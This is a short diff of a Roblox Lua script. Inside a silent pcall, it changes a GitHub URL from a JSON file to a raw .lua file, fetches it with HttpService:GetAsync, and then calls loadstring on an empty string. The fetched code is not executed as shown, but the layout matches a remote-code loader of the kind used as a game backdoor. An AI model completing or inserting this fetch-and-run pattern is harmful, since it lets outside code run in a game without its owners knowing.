@@ -1,7 +1,7 @@
 local s,m = pcall(function()
 	local HttpService = game:GetService("HttpService")
-	local UrlLope = "https://github.com/KaitarStudios/LOPE/blob/main/P.json"
-	local response = HttpService:GetAsync(UrlLope)
+	local Url = "https://raw.githubusercontent.com/HalcyonPayback/TN/refs/heads/main/Prg2.lua"
+	local response = HttpService:GetAsync(Url)
 	loadstring("")
 end)
 
